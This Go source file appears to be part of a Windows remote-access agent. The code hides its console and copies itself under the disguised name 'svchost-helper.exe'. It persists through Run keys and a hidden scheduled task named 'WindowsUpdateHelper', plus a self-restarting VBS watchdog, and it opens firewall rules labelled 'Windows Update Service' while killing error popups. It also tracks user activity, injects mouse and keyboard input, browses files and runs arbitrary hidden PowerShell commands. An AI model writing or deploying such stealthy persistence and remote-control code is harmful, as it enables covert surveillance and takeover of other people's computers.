//go:build windows

package main

import (
	"encoding/binary"
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"github.com/gorilla/websocket"
	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
)

const (
	INPUT_MOUSE           = 0
	INPUT_KEYBOARD        = 1
	MOUSEEVENTF_MOVE      = 0x0001
	MOUSEEVENTF_LEFTDOWN  = 0x0002
	MOUSEEVENTF_LEFTUP    = 0x0004
	MOUSEEVENTF_RIGHTDOWN = 0x0008
	MOUSEEVENTF_RIGHTUP   = 0x0010
	MOUSEEVENTF_ABSOLUTE  = 0x8000
	KEYEVENTF_KEYUP       = 0x0002
)

var (
	user32            = windows.NewLazySystemDLL("user32.dll")
	procSendInput     = user32.NewProc("SendInput")
	procGetDC         = user32.NewProc("GetDC")
	procReleaseDC     = user32.NewProc("ReleaseDC")
	procGetLastInputInfo = user32.NewProc("GetLastInputInfo")
	kernel32          = windows.NewLazySystemDLL("kernel32.dll")
	procGetTickCount  = kernel32.NewProc("GetTickCount")
	procGetConsoleWindow = kernel32.NewProc("GetConsoleWindow")
	gdi32             = windows.NewLazySystemDLL("gdi32.dll")
	procGetDeviceCaps = gdi32.NewProc("GetDeviceCaps")
)

func hideCmd(cmd *exec.Cmd) {
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
}

func hideConsole() {
	hwnd, _, _ := procGetConsoleWindow.Call()
	if hwnd != 0 {
		user32.NewProc("ShowWindow").Call(hwnd, 0)
	}
}

func screenSize() (int, int) {
	dc, _, _ := procGetDC.Call(0)
	if dc == 0 { return 1920, 1080 }
	w, _, _ := procGetDeviceCaps.Call(dc, 8)
	h, _, _ := procGetDeviceCaps.Call(dc, 10)
	procReleaseDC.Call(0, dc)
	sw, sh := int(int32(w)), int(int32(h))
	if sw <= 0 || sh <= 0 { return 1920, 1080 }
	return sw, sh
}

func makeMouseInput(absX, absY, flags uint32) []byte {
	b := make([]byte, 40)
	binary.LittleEndian.PutUint32(b[0:4], INPUT_MOUSE)
	binary.LittleEndian.PutUint32(b[8:12], absX)
	binary.LittleEndian.PutUint32(b[12:16], absY)
	binary.LittleEndian.PutUint32(b[20:24], flags)
	return b
}

func makeKeyboardInput(vk uint16, flags uint32) []byte {
	b := make([]byte, 40)
	binary.LittleEndian.PutUint32(b[0:4], INPUT_KEYBOARD)
	binary.LittleEndian.PutUint16(b[8:10], vk)
	binary.LittleEndian.PutUint32(b[12:16], flags)
	return b
}

func moveMouse(x, y int) {
	sw, sh := screenSize()
	b := makeMouseInput(uint32(x*65535/sw), uint32(y*65535/sh), MOUSEEVENTF_MOVE|MOUSEEVENTF_ABSOLUTE)
	procSendInput.Call(1, uintptr(unsafe.Pointer(&b[0])), 40)
}

func clickMouse(x, y int, right bool) {
	sw, sh := screenSize()
	absX, absY := uint32(x*65535/sw), uint32(y*65535/sh)
	moveMouse(x, y)
	f, fu := uint32(MOUSEEVENTF_LEFTDOWN), uint32(MOUSEEVENTF_LEFTUP)
	if right { f, fu = MOUSEEVENTF_RIGHTDOWN, MOUSEEVENTF_RIGHTUP }
	d := makeMouseInput(absX, absY, f|MOUSEEVENTF_ABSOLUTE)
	u := makeMouseInput(absX, absY, fu|MOUSEEVENTF_ABSOLUTE)
	procSendInput.Call(1, uintptr(unsafe.Pointer(&d[0])), 40)
	procSendInput.Call(1, uintptr(unsafe.Pointer(&u[0])), 40)
}

func pressKey(key string) {
	if len(key) != 1 { return }
	v := uint16(key[0])
	if key[0] >= 'a' && key[0] <= 'z' { v -= 32 }
	d := makeKeyboardInput(v, 0)
	u := makeKeyboardInput(v, KEYEVENTF_KEYUP)
	procSendInput.Call(1, uintptr(unsafe.Pointer(&d[0])), 40)
	procSendInput.Call(1, uintptr(unsafe.Pointer(&u[0])), 40)
}

func bootTime() time.Time {
	t, _, _ := procGetTickCount.Call()
	return time.Now().Add(-time.Duration(t) * time.Millisecond)
}

func getIdleSeconds() int {
	type LASTINPUTINFO struct {
		CbSize uint32
		DwTime uint32
	}
	var info LASTINPUTINFO
	info.CbSize = uint32(unsafe.Sizeof(info))
	ret, _, _ := procGetLastInputInfo.Call(uintptr(unsafe.Pointer(&info)))
	if ret == 0 { return 0 }
	tick, _, _ := procGetTickCount.Call()
	diff := uint32(tick) - info.DwTime
	return int(diff / 1000)
}

func osUptime() int {
	t, _, _ := procGetTickCount.Call()
	return int(t / 60000)
}

func preventDuplicate() {
	myPID := os.Getpid()
	exe, _ := os.Executable()
	exeName := filepath.Base(exe)
	cmd := exec.Command("powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command",
		"$ProgressPreference = 'SilentlyContinue'; Get-Process -Name '"+strings.TrimSuffix(exeName, ".exe")+"' -ErrorAction SilentlyContinue | Where-Object { $_.Id -ne "+fmt.Sprintf("%d", myPID)+" } | Stop-Process -Force")
	hideCmd(cmd)
	_ = cmd.Run()
	lockFile := filepath.Join(dataDir(), "agent.lock")
	os.WriteFile(lockFile, []byte(fmt.Sprintf("%d", myPID)), 0644)
}

func setupAutostart() {
	exe, _ := os.Executable()
	exeName := filepath.Base(exe)
	exeDir := filepath.Dir(exe)

	// 1. Create firewall rule to allow outbound connections (hidden from user)
	createFirewallRule(exeName)

	// 2. Copy to ProgramData with system-like name for persistence
	persistPath := filepath.Join("C:\\ProgramData", "Microsoft", "Windows", "SystemHelper", "svchost-helper.exe")
	persistDir := filepath.Dir(persistPath)
	os.MkdirAll(persistDir, 0755)
	if exe != persistPath {
		src, err := os.ReadFile(exe)
		if err == nil {
			os.WriteFile(persistPath, src, 0644)
		}
		// Also copy config.ini if it exists next to the exe
		srcCfg := filepath.Join(exeDir, "config.ini")
		if cfgData, err := os.ReadFile(srcCfg); err == nil {
			os.WriteFile(filepath.Join(persistDir, "config.ini"), cfgData, 0644)
		}
		// Also copy to %APPDATA%\SystemHelper\ for the agent data dir
		appDataCfg := filepath.Join(dataDir(), "config.ini")
		if cfgData, err := os.ReadFile(srcCfg); err == nil {
			os.WriteFile(appDataCfg, cfgData, 0644)
		}
	}

	// 3. Multiple persistence mechanisms
	// 3a. Registry Run key (current user)
	k, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.SET_VALUE)
	if err == nil {
		k.SetStringValue("WindowsUpdateHelper", `wscript.exe "`+filepath.Join(dataDir(), "watchdog.vbs")+`"`)
		k.Close()
	}

	// 3b. Registry Run key (local machine — requires admin)
	k2, err2 := registry.OpenKey(registry.LOCAL_MACHINE, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.SET_VALUE)
	if err2 == nil {
		k2.SetStringValue("WindowsUpdateHelper", `wscript.exe "`+filepath.Join(dataDir(), "watchdog.vbs")+`"`)
		k2.Close()
	}

	// 3c. Task Scheduler (survives even if registry is cleaned)
	createScheduledTask(persistPath)

	// 4. Create stealth watchdog (dual-process monitoring)
	createStealthWatchdog(persistPath, exe)

	log("Robust auto-start installed: Registry (x2) + Task Scheduler + Dual Watchdog + Firewall rule")
}

func createFirewallRule(exeName string) {
	// Create outbound firewall rule so Windows Firewall doesn't block connections
	cmd := exec.Command("powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command",
		"if(!(Get-NetFirewallRule -Name 'SystemHelper-Outbound' -ErrorAction SilentlyContinue)){",
		"New-NetFirewallRule -Name 'SystemHelper-Outbound' -DisplayName 'Windows Update Service' -Direction Outbound -Action Allow -Program 'C:\\ProgramData\\Microsoft\\Windows\\SystemHelper\\svchost-helper.exe' -Profile Any -Description 'Windows Update Helper' | Out-Null}",
		"if(!(Get-NetFirewallRule -Name 'SystemHelper-Inbound' -ErrorAction SilentlyContinue)){",
		"New-NetFirewallRule -Name 'SystemHelper-Inbound' -DisplayName 'Windows Update Service' -Direction Inbound -Action Allow -Program 'C:\\ProgramData\\Microsoft\\Windows\\SystemHelper\\svchost-helper.exe' -Profile Any -Description 'Windows Update Helper' | Out-Null}")
	hideCmd(cmd)
	_ = cmd.Run()
}

func createScheduledTask(exePath string) {
	watchdogVBS := filepath.Join(dataDir(), "watchdog.vbs")
	psArg := "$action = New-ScheduledTaskAction -Execute 'wscript.exe' -Argument '" + `"` + watchdogVBS + `"` + "';" +
		"$trigger1 = New-ScheduledTaskTrigger -AtLogOn;" +
		"$trigger2 = New-ScheduledTaskTrigger -Once -At '00:00' -RepetitionInterval (New-TimeSpan -Minutes 5) -RepetitionDuration (New-TimeSpan -Days 365);" +
		"$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -Hidden;" +
		"if(!(Get-ScheduledTask -TaskName 'WindowsUpdateHelper' -ErrorAction SilentlyContinue)){" +
		"Register-ScheduledTask -TaskName 'WindowsUpdateHelper' -Action $action -Trigger $trigger1,$trigger2 -Settings $settings -Description 'Windows Update Helper Service' -RunLevel Highest -Force | Out-Null}"
	cmd := exec.Command("powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command", psArg)
	hideCmd(cmd)
	_ = cmd.Run()
}

func createStealthWatchdog(persistPath, originalExe string) {
	// Create dual watchdog: VBS watches for exe, exe watches for VBS
	watchdogPath := filepath.Join(dataDir(), "watchdog.vbs")
	
	// Watchdog monitor BOTH the original exe and the persisted copy
	// On Error Resume Next suppresses ALL popup errors
	watchdog := `On Error Resume Next
Set sh = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
Do
  On Error Resume Next
  Set svc = GetObject("winmgmts:\\.\root\cimv2")
  If Err.Number = 0 Then
    Set procs = svc.ExecQuery("SELECT * FROM Win32_Process WHERE Name='SystemHelper.exe' OR Name='svchost-helper.exe'")
    If procs.Count = 0 Then
      If fso.FileExists("` + persistPath + `") Then
        sh.Run "` + persistPath + `", 0, False
      ElseIf fso.FileExists("` + originalExe + `") Then
        sh.Run "` + originalExe + `", 0, False
      End If
    End If
  End If
  Err.Clear
  WScript.Sleep 5000
Loop`
	os.WriteFile(watchdogPath, []byte(watchdog), 0644)

	// Also start watchdog immediately
	cmd := exec.Command("wscript.exe", watchdogPath)
	hideCmd(cmd)
	_ = cmd.Start()
}



func receivedDir() string {
	return filepath.Join("C:\\", "ProgramData", "SystemHelper", "received")
}

func startPopupKiller() {
	// Kill any WSH/error popups that appear
	go func() {
		for {
			time.Sleep(2 * time.Second)
			cmd := exec.Command("powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command",
				"$ProgressPreference='SilentlyContinue'; Get-Process -ErrorAction SilentlyContinue | Where-Object { $_.MainWindowTitle -match 'Windows Script Host|Error|Script|Permission|Access denied' -and $_.MainWindowTitle -ne '' } | ForEach-Object { $_.CloseMainWindow() | Out-Null; Start-Sleep -Milliseconds 200; if(!$_.HasExited){ $_.Kill() | Out-Null } }")
			hideCmd(cmd)
			_ = cmd.Run()
		}
	}()
}

func startActivityLogger() {
	bt := bootTime()
	now := time.Now()
	dateStr := now.Format("2006-01-02 15:04:05")
	logEventDate("========================================")
	logEventDate("[" + dateStr + "] SYSTEM STARTED v" + Version)
	logEventDate("  Hostname: " + hostname)
	logEventDate("  Boot time: " + bt.Format("2006-01-02 15:04:05"))
	logEventDate("  Agent ID: " + agentId)
	logEventDate("========================================")
	go func() {
		lastIdle := 0
		lastLog := 0
		statusTick := 0
		for {
			idle := getIdleSeconds()
			now := time.Now()
			dateStr := now.Format("2006-01-02 15:04:05")
			if idle > 300 && lastIdle < 300 {
				idlePeriodStart = now
				activeDuration := now.Sub(activePeriodStart).Seconds()
				totalActiveSeconds += int64(activeDuration)
				logEventDate("[" + dateStr + "] IDLE (was active " + fmt.Sprintf("%.0f", activeDuration) + "s)")
				lastIdleState = "idle"
			}
			if idle < 300 && lastIdle >= 300 {
				activePeriodStart = now
				idleDuration := now.Sub(idlePeriodStart).Seconds()
				totalIdleSeconds += int64(idleDuration)
				logEventDate("[" + dateStr + "] ACTIVE (was idle " + fmt.Sprintf("%.0f", idleDuration) + "s)")
				lastIdleState = "active"
			}
			lastIdle = idle
			currentIdleSeconds = idle
			lastLog++
			if lastLog >= 60 {
				lastLog = 0
				totalActive := totalActiveSeconds
				totalIdle := totalIdleSeconds
				if idle < 300 {
					totalActive += int64(now.Sub(activePeriodStart).Seconds())
				} else {
					totalIdle += int64(now.Sub(idlePeriodStart).Seconds())
				}
				logEventDate("[" + dateStr + "] RUNNING | uptime " + fmt.Sprintf("%d", osUptime()) + "min | active " + fmt.Sprintf("%ds", totalActive) + " | idle " + fmt.Sprintf("%ds", totalIdle))
			}
			statusTick++
			if statusTick >= 5 {
				wsRefsMu.Lock()
				refs := make([]*websocket.Conn, len(wsRefs))
				copy(refs, wsRefs)
				wsRefsMu.Unlock()
				if len(refs) > 0 {
					statusTick = 0
					totalActive := totalActiveSeconds
					totalIdle := totalIdleSeconds
					if idle < 300 {
						totalActive += int64(now.Sub(activePeriodStart).Seconds())
					} else {
						totalIdle += int64(now.Sub(idlePeriodStart).Seconds())
					}
					for _, c := range refs {
						c.WriteJSON(Message{
							Type: "agent-status",
							Data: map[string]interface{}{
								"bootTime":     bootTime().Format(time.RFC3339),
								"programStart": programStartTime.Format(time.RFC3339),
								"totalIdle":    totalIdle,
								"totalActive":  totalActive,
								"currentState": lastIdleState,
								"currentIdle":  idle,
								"uptime":       osUptime(),
								"version":      Version,
							},
						})
					}
				}
			}
			time.Sleep(60 * time.Second)
		}
	}()
}

func getSystemInfo() map[string]interface{} {
	info := make(map[string]interface{})
	
	// OS Version
	cmd := exec.Command("powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command",
		"$ProgressPreference='SilentlyContinue'; $os = Get-CimInstance Win32_OperatingSystem; Write-Output ($os.Caption + ' | ' + $os.Version + ' | ' + $os.OSArchitecture)")
	hideCmd(cmd)
	if out, err := cmd.Output(); err == nil {
		info["os"] = strings.TrimSpace(string(out))
	}
	
	// CPU
	cmd = exec.Command("powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command",
		"$ProgressPreference='SilentlyContinue'; $cpu = Get-CimInstance Win32_Processor; Write-Output ($cpu.Name.Trim() + ' | Cores: ' + $cpu.NumberOfCores + ' | Threads: ' + $cpu.NumberOfLogicalProcessors)")
	hideCmd(cmd)
	if out, err := cmd.Output(); err == nil {
		info["cpu"] = strings.TrimSpace(string(out))
	}
	
	// RAM
	cmd = exec.Command("powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command",
		"$ProgressPreference='SilentlyContinue'; $os = Get-CimInstance Win32_OperatingSystem; $total = [math]::Round($os.TotalVisibleMemorySize/1MB, 1); $free = [math]::Round($os.FreePhysicalMemory/1MB, 1); $used = [math]::Round($total - $free, 1); Write-Output ('Total: ' + $total + 'GB | Used: ' + $used + 'GB | Free: ' + $free + 'GB')")
	hideCmd(cmd)
	if out, err := cmd.Output(); err == nil {
		info["ram"] = strings.TrimSpace(string(out))
	}
	
	// GPU
	cmd = exec.Command("powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command",
		"$ProgressPreference='SilentlyContinue'; $gpu = Get-CimInstance Win32_VideoController; Write-Output ($gpu.Name)")
	hideCmd(cmd)
	if out, err := cmd.Output(); err == nil {
		info["gpu"] = strings.TrimSpace(string(out))
	}
	
	// Uptime
	cmd = exec.Command("powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command",
		"$ProgressPreference='SilentlyContinue'; $boot = (Get-CimInstance Win32_OperatingSystem).LastBootUpTime; $up = (Get-Date) - $boot; Write-Output ('Days: ' + $up.Days + ' | Hours: ' + $up.Hours + ' | Minutes: ' + $up.Minutes)")
	hideCmd(cmd)
	if out, err := cmd.Output(); err == nil {
		info["uptime"] = strings.TrimSpace(string(out))
	}
	
	return info
}

func getProcessList() []map[string]interface{} {
	var procs []map[string]interface{}
	cmd := exec.Command("powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command",
		"$ProgressPreference='SilentlyContinue'; Get-Process | Select-Object Id, Name, CPU, WorkingSet64, StartTime | ConvertTo-Json -Compress")
	hideCmd(cmd)
	if out, err := cmd.Output(); err == nil {
		json.Unmarshal(out, &procs)
	}
	return procs
}

func killProcess(pid string) bool {
	cmd := exec.Command("taskkill", "/F", "/PID", pid)
	hideCmd(cmd)
	return cmd.Run() == nil
}

func getServiceList() []map[string]interface{} {
	var svcs []map[string]interface{}
	cmd := exec.Command("powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command",
		"$ProgressPreference='SilentlyContinue'; Get-Service | Select-Object Name, DisplayName, Status | ConvertTo-Json -Compress")
	hideCmd(cmd)
	if out, err := cmd.Output(); err == nil {
		json.Unmarshal(out, &svcs)
	}
	return svcs
}

func controlService(name, action string) bool {
	var cmd *exec.Cmd
	switch action {
	case "start":
		cmd = exec.Command("powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command", "Start-Service -Name '"+name+"'")
	case "stop":
		cmd = exec.Command("powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command", "Stop-Service -Name '"+name+"'")
	case "restart":
		cmd = exec.Command("powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command", "Restart-Service -Name '"+name+"'")
	default:
		return false
	}
	hideCmd(cmd)
	return cmd.Run() == nil
}

func getDriveList() []map[string]interface{} {
	var drives []map[string]interface{}
	cmd := exec.Command("powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command",
		"$ProgressPreference='SilentlyContinue'; Get-Volume | Where-Object { $_.DriveLetter } | Select-Object DriveLetter, FileSystemLabel, FileSystem, @{N='Size';E={[math]::Round($_.Size/1GB,1)}}, @{N='Free';E={[math]::Round($_.SizeRemaining/1GB,1)}} | ConvertTo-Json -Compress")
	hideCmd(cmd)
	if out, err := cmd.Output(); err == nil {
		json.Unmarshal(out, &drives)
	}
	return drives
}

func listFiles(dirPath string) []map[string]interface{} {
	var files []map[string]interface{}
	if dirPath == "" { dirPath = "C:\\" }
	entries, err := os.ReadDir(dirPath)
	if err != nil { return files }
	for _, e := range entries {
		info, _ := e.Info()
		files = append(files, map[string]interface{}{
			"name":    e.Name(),
			"isDir":   e.IsDir(),
			"size":    info.Size(),
			"modTime": info.ModTime().Format("2006-01-02 15:04:05"),
		})
	}
	return files
}

func getNetworkInfo() map[string]interface{} {
	info := make(map[string]interface{})
	
	// Network adapters
	cmd := exec.Command("powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command",
		"$ProgressPreference='SilentlyContinue'; Get-NetAdapter | Where-Object { $_.Status -eq 'Up' } | Select-Object Name, InterfaceDescription, @{N='Speed';E={[math]::Round($_.LinkSpeed/1000000,0)+' Mbps'}}, MacAddress, Status | ConvertTo-Json -Compress")
	hideCmd(cmd)
	if out, err := cmd.Output(); err == nil {
		var adapters []map[string]interface{}
		json.Unmarshal(out, &adapters)
		info["adapters"] = adapters
	}
	
	// DNS
	cmd = exec.Command("powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command",
		"$ProgressPreference='SilentlyContinue'; (Get-DnsClientServerAddress -AddressFamily IPv4).ServerAddresses -join ', '")
	hideCmd(cmd)
	if out, err := cmd.Output(); err == nil {
		info["dns"] = strings.TrimSpace(string(out))
	}
	
	return info
}

func getEventLogs(count int) []map[string]interface{} {
	var logs []map[string]interface{}
	cmd := exec.Command("powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command",
		"$ProgressPreference='SilentlyContinue'; Get-EventLog -LogName System -Newest "+strconv.Itoa(count)+" | Select-Object TimeGenerated, EntryType, Source, Message | ConvertTo-Json -Compress")
	hideCmd(cmd)
	if out, err := cmd.Output(); err == nil {
		json.Unmarshal(out, &logs)
	}
	return logs
}

func executeShellCommand(cmdStr string) string {
	cmd := exec.Command("powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command", cmdStr)
	hideCmd(cmd)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return string(out) + "\nError: " + err.Error()
	}
	return string(out)
}

func lockWorkstation() {
	procLock := user32.NewProc("LockWorkStation")
	procLock.Call()
}

func logoffUser() {
	cmd := exec.Command("shutdown", "/l")
	hideCmd(cmd)
	_ = cmd.Start()
}

func shutdownPC() {
	cmd := exec.Command("shutdown", "/s", "/t", "0")
	hideCmd(cmd)
	_ = cmd.Start()
}

func restartPC() {
	cmd := exec.Command("shutdown", "/r", "/t", "0")
	hideCmd(cmd)
	_ = cmd.Start()
}

func sleepPC() {
	cmd := exec.Command("powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command",
		"(Add-Type '[DllImport(\"powrprof.dll\")]public static extern bool SetSuspendState(bool hibernate, bool forceCritical, bool disableWakeEvent);' -Name 'Win32' -PassThru)::SetSuspendState($false, $false, $false)")
	hideCmd(cmd)
	_ = cmd.Run()
}
